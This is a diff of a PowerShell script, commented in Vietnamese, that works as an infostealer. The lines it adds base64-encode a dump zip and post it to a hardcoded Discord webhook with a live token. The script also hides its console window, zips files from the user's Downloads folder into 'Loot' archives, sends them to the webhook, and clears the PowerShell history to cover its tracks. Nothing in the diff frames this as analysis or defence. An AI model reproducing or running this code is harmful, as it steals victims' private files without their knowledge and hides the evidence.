@@ -44,7 +44,7 @@ while (!(Test-Path "$dumpFile")) {
 }
 
 # ============================================
-# GỬI QUA DISCORD (giữ nguyên code gốc)
+# DISCORD WEBHOOK CONFIG
 # ============================================
 
 $dc = "https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
@@ -53,7 +53,34 @@ if ($hookurl.Length -lt 120){
     $hookurl = ("https://discord.com/api/webhooks/" + "$dc")
 }
 
-# Ẩn cửa sổ console
+# ============================================
+# GỬI FILE ZIP QUA DISCORD (QUAN TRỌNG)
+# ============================================
+
+if (Test-Path "$dumpFile") {
+    $fileBytes = [System.IO.File]::ReadAllBytes("$dumpFile")
+    $fileBase64 = [System.Convert]::ToBase64String($fileBytes)
+    
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $multipartContent = @"
+--$boundary
+Content-Disposition: form-data; name="file1"; filename="$([System.IO.Path]::GetFileName("$dumpFile"))"
+Content-Type: application/zip
+
+$fileBase64
+--$boundary--
+"@
+    $headers = @{"Content-Type" = "multipart/form-data; boundary=$boundary"}
+    
+    try {
+        Invoke-RestMethod -Uri $hookurl -Method Post -Body $multipartContent -Headers $headers -UseBasicParsing
+    } catch {}
+}
+
+# ============================================
+# ẨN CỬA SỔ (CHO FINDSANDsend)
+# ============================================
+
 $hide = 'y'
 if($hide -eq 'y'){
     $w=(Get-Process -PID $pid).MainWindowHandle
@@ -69,6 +96,10 @@ if($hide -eq 'y'){
     }
 }
 
+# ============================================
+# FINDSANDsend (QUÉT FILE VÀ GỬI QUA DISCORD)
+# ============================================
+
 Function FindAndSend {
     param ([string[]]$FileType,[string[]]$Path)
     $maxZipFileSize = 10MB
@@ -76,7 +107,6 @@ Function FindAndSend {
     $index = 1
     $zipFilePath ="$env:temp/Loot$index.zip"
     
-    #Neu kh co duong dan thi se quet het
     $Path = "DownLoads"
     If($Path -ne $null){
         $foldersToSearch = "$env:USERPROFILE\"+$Path
@@ -123,7 +153,7 @@ Function FindAndSend {
 FindAndSend
 
 # ============================================
-# DỌN DẸP DẤU VẾT (giữ nguyên code gốc)
+# DỌN DẸP DẤU VẾT
 # ============================================
 
 Clear-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
